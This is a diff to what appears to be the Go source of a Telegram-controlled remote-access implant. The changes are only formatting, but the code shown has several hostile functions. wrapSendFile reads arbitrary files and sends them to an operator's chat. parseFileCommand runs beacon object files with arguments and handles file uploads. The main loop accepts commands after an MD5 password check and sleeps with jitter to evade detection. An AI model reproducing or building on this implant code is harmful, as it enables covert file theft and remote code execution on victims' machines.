@@ -17,11 +17,11 @@ var (
 )
 
 func wrapSendFile(chatID int64, fullpath string) {
-    data, err := os.ReadFile(fullpath)
-    if err != nil {
-        SendMessage(chatID, err.Error())
-        return
-    }
+	data, err := os.ReadFile(fullpath)
+	if err != nil {
+		SendMessage(chatID, err.Error())
+		return
+	}
 	sendFile(chatID, filepath.Base(fullpath), data)
 }
 
@@ -112,8 +112,8 @@ func parseFileCommand(chatID int64, file *Document, caption string) {
 		if err == nil {
 			bofArgs := strings.Split(strings.TrimSpace(caption[4:]), " ")
 			executeBof(chatID, bofBytes, bofArgs)
-		} 
-	} else if (strings.HasPrefix(caption, "/up")) {
+		}
+	} else if strings.HasPrefix(caption, "/up") {
 		var responseText string
 		// Gonna download a file from the bot
 		filePath := strings.TrimSpace(caption[3:])
@@ -155,7 +155,7 @@ func main() {
 			if contains(chatIDs, chatID) {
 				if file != nil {
 					parseFileCommand(chatID, file, caption)
-				} else  {
+				} else {
 					parseCommand(chatID, text)
 				}
 			} else if md5Hash(text) == passMd5 {
@@ -167,11 +167,11 @@ func main() {
 				SendMessage(chatID, responseText)
 			}
 		}
-		if (len(updates.Result) == 0) {
+		if len(updates.Result) == 0 {
 			sleep_time, _ := strconv.Atoi(sleep_time)
 			sleep_time_jitter, _ := strconv.Atoi(sleep_time_jitter)
 			time_to_sleep := calcSleepTime(sleep_time, sleep_time_jitter)
-            time.Sleep(time.Duration(time_to_sleep) * time.Second)
+			time.Sleep(time.Duration(time_to_sleep) * time.Second)
 		}
 
 	}
